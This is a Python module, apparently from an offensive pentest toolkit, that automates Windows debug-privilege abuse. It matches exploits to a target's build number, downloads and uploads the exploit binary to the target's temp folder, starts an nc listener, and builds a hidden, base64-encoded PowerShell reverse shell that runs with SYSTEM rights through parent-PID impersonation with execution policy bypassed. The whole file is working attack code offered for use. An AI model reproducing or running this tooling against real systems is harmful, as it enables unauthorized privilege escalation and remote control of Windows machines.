import base64
import re
import shutil
import subprocess
import urllib.request
from pathlib import Path

import yaml

from core.attacker import resolve_lhost
from core.runner import run_module_by_name

# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
W_BOLD = '\033[1m'

# =========================================================
# PATHS
# =========================================================

BASE_DIR = Path(__file__).resolve().parents[3]

EXPLOIT_DIR = (
    BASE_DIR /
    "exploits" /
    "windows" /
    "debug"
)

SHELL_DIR = (
    BASE_DIR /
    "shells"
)

REMOTE_DIR = "C:\\Windows\\Temp"

# =========================================================
# HELPERS
# =========================================================

def copy_to_clipboard(text):

    try:

        subprocess.run(
            [
                "xclip",
                "-selection",
                "clipboard",
            ],
            input=text,
            text=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        return True

    except Exception:

        return False


def extract_build(text):

    patterns = [
        r'build\s+(\d+)',
        r'10\.0\.(\d+)',
        r'(\d{5})'
    ]

    for pattern in patterns:

        match = re.search(pattern, text, re.I)

        if match:
            return int(match.group(1))

    return None


# =========================================================
# SHELLS
# =========================================================

def start_listener(port):

    try:

        subprocess.Popen(
            [
                "x-terminal-emulator",
                "-e",
                f"nc -lvnp {port}"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        print(
            f"\n{G}[+]{W} "
            f"Listener started on "
            f"{Y}{port}{W}"
        )

        return True

    except Exception as e:

        print(
            f"\n{R}[!] Failed to start listener:{W} {e}"
        )

        return False


def build_encoded_powershell(args, lport=4444):

    lhost = resolve_lhost(args)

    if not lhost:

        print(
            f"\n{R}[!] Failed to resolve LHOST.{W}"
        )

        return None

    shell_path = (
        SHELL_DIR /
        "windows" /
        "powershell" /
        "reverse.ps1"
    )

    if not shell_path.exists():

        print(
            f"\n{R}[!] Missing shell template:{W} "
            f"{shell_path}"
        )

        return None

    payload = (
        shell_path.read_text()
        .replace("{lhost}", lhost)
        .replace("{lport}", str(lport))
    )

    encoded = base64.b64encode(
        payload.encode("utf-16le")
    ).decode()

    return encoded


# =========================================================
# EXPLOITS
# =========================================================

def load_exploits():

    exploits = []

    if not EXPLOIT_DIR.exists():
        return exploits

    for folder in EXPLOIT_DIR.iterdir():

        if not folder.is_dir():
            continue

        meta = folder / "meta.yaml"

        if not meta.exists():
            continue

        try:

            data = yaml.safe_load(
                meta.read_text()
            )

            if not data:
                continue

            data["folder"] = folder

            exploits.append(data)

        except Exception:
            continue

    return exploits


def match_exploits(build, exploits):

    matches = []

    for exploit in exploits:

        build_info = exploit.get(
            "builds",
            {}
        )

        min_build = build_info.get(
            "min",
            0
        )

        max_build = build_info.get(
            "max",
            999999
        )

        if min_build <= build <= max_build:
            matches.append(exploit)

    return matches


# =========================================================
# BINARIES
# =========================================================

def find_local_binary(folder):

    extensions = [
        "*.exe",
        "*.dll",
        "*.ps1",
        "*.bat",
    ]

    for ext in extensions:

        matches = list(folder.glob(ext))

        if matches:

            binary = matches[0]

            if binary.exists():
                return binary.resolve()

    return None


def download_exploit(exploit):

    dl = exploit.get("download")

    if not dl:
        return None

    url = dl.get("url")
    filename = dl.get("file")

    if not url or not filename:
        return None

    dst = (
        Path.cwd() / filename
    ).resolve()

    try:

        print(f"\n{B}[*]{W} DOWNLOADING")

        urllib.request.urlretrieve(
            url,
            dst
        )

        if not dst.exists():

            print(
                f"\n{R}[!] Download failed.{W}"
            )

            return None

        print(
            f"\n  {B}├──{W} URL:  {C}{url}{W}"
        )

        print(
            f"  {B}└──{W} FILE: {G}{dst}{W}"
        )

        return dst

    except Exception as e:

        print(
            f"\n{R}[!] Download failed:{W} {e}"
        )

        return None


# =========================================================
# OUTPUT
# =========================================================

def render_target(build):

    print(f"\n{B}[*]{W} TARGET")

    print(
        f"\n  {B}└──{W} Build: {Y}{build}{W}"
    )


def render_matches(matches):

    print(
        f"\n{B}[*]{W} "
        f"COMPATIBLE DEBUG EXPLOITS\n"
    )

    for idx, exploit in enumerate(
        matches,
        start=1
    ):

        connector = (
            "└──"
            if idx == len(matches)
            else "├──"
        )

        print(
            f"  {B}{connector}{W} "
            f"[{Y}{idx}{W}] "
            f"{W_BOLD}{exploit['name']}{W}"
        )


# =========================================================
# STAGE
# =========================================================

def stage_exploit(exploit, data):

    folder = exploit["folder"]

    local = find_local_binary(folder)

    if not local:

        local = download_exploit(exploit)

    if not local:

        print(
            f"\n{R}[!] Failed to locate exploit.{W}"
        )

        return None

    local = Path(local).resolve()

    cwd_copy = (
        Path.cwd() / local.name
    ).resolve()

    try:

        if local != cwd_copy:
            shutil.copy2(local, cwd_copy)

        local = cwd_copy

    except Exception as e:

        print(
            f"\n{R}[!] Failed to copy exploit:{W} {e}"
        )

        return None

    remote = (
        f"{REMOTE_DIR}\\{local.name}"
    )

    print(f"\n{B}[*]{W} STAGED EXPLOIT")

    print(
        f"\n  {B}├──{W} Local:  "
        f"{C}{local}{W}"
    )

    print(
        f"  {B}└──{W} Remote: "
        f"{G}{remote}{W}"
    )

    try:

        choice = input(
            f"\n{B}transfer to target? [Y/n]{W}> "
        ).strip().lower()

    except (KeyboardInterrupt, EOFError):

        print()
        return None

    if choice and choice != "y":
        return remote

    print(f"\n{B}[*]{W} TRANSFERRING")

    try:

        result = run_module_by_name(
            "upload.windows",
            [
                str(local),
                remote,
            ],
            data,
        )

    except Exception as e:

        print(
            f"\n{R}[!] Upload module failed:{W} {e}"
        )

        return None

    if result is None:

        print(
            f"\n{R}[!] Upload failed.{W}"
        )

        return None

    print(f"\n{G}[+] Upload complete.{W}")

    return remote


# =========================================================
# EXECUTION
# =========================================================

def render_execution(
    exploit,
    remote,
    args,
):

    reverse = input(
        f"\n{B}Reverse shell? [Y/n]{W}> "
    ).strip().lower()

    encoded = None
    lport = 4444

    if not reverse or reverse == "y":

        port_in = input(
            f"{B}LPORT{W}> "
        ).strip()

        lport = (
            int(port_in)
            if port_in
            else 4444
        )

        encoded = build_encoded_powershell(
            args,
            lport,
        )

        start_listener(lport)

    # =====================================================
    # PSGETSYSTEM
    # =====================================================

    if exploit["name"] == "PSGetSystem":

        print(
            f"\n{Y}"
            f"┌── SYSTEM PID HELP "
            f"──────────────────────────────────────┐{W}"
        )

        print(
            f"{Y}│{W} "
            f'tasklist /svc | findstr /i "winlogon services spoolsv"'
        )

        print(
            f"{Y}│{W} "
            f'powershell "Get-Process winlogon,services,spoolsv"'
        )

        print(
            f"{Y}"
            f"└──────────────────────────────────────────────────┘{W}"
        )

        pid = input(
            f"{B}SYSTEM PID{W}> "
        ).strip()

        if not pid:

            print(
                f"\n{R}[!] Missing SYSTEM PID.{W}"
            )

            return

        cmd = (
            f'powershell.exe -ep bypass -c "'
            f'. .\\Get-System.ps1; '
            f'ImpersonateFromParentPid '
            f'-ppid {pid} '
            f'-command C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe '
            f'-cmdargs \''
            f'-ep bypass -w hidden -enc {encoded}'
            f'\'"'
        )

        copied = copy_to_clipboard(cmd)

        print(
            f"\n{G}"
            f"┌── EXECUTION "
            f"─────────────────────────────────────┐{W}"
        )

        print(f"{G}│{W} {cmd}")

        print(
            f"{G}"
            f"└──────────────────────────────────────────────────┘{W}"
        )

        if copied:

            print(
                f"\n{B}  └── "
                f"{G}Execution copied to clipboard{W}"
            )


# =========================================================
# NOTES
# =========================================================

def render_notes(exploit):

    notes = exploit.get("notes")

    if not notes:
        return

    print(
        f"\n{Y}"
        f"┌── NOTES "
        f"─────────────────────────────────────────┐{W}"
    )

    for note in notes:
        print(f"{Y}│{W} {note}")

    print(
        f"{Y}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


# =========================================================
# MAIN
# =========================================================

def run(data=None, cred=None, args=None):

    print(
        f"\n{W_BOLD}"
        f"[*] WINDOWS DEBUG PRIVILEGE ABUSE{W}"
    )

    # =====================================================
    # BUILD
    # =====================================================

    try:

        build_text = input(
            f"{B}build/version{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()
        return data

    build = extract_build(build_text)

    if not build:

        print(
            f"\n{R}[!] "
            f"Failed to parse build number.{W}"
        )

        return data

    # =====================================================
    # LOAD
    # =====================================================

    exploits = load_exploits()

    if not exploits:

        print(
            f"\n{R}[!] "
            f"No exploit definitions loaded.{W}"
        )

        return data

    # =====================================================
    # MATCH
    # =====================================================

    matches = match_exploits(
        build,
        exploits,
    )

    render_target(build)

    if not matches:

        print(
            f"\n{R}[!] "
            f"No compatible debug exploits found.{W}"
        )

        return data

    render_matches(matches)

    # =====================================================
    # SELECT
    # =====================================================

    try:

        choice = input(
            f"\n{B}select{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()
        return data

    if not choice.isdigit():
        return data

    idx = int(choice) - 1

    if idx < 0 or idx >= len(matches):
        return data

    selected = matches[idx]

    # =====================================================
    # STAGE
    # =====================================================

    staged = stage_exploit(
        selected,
        data,
    )

    if not staged:

        print(
            f"\n{R}[!] "
            f"Failed to stage exploit.{W}"
        )

        return data

    # =====================================================
    # EXECUTION
    # =====================================================

    render_execution(
        selected,
        staged,
        args,
    )

    render_notes(selected)

    return data
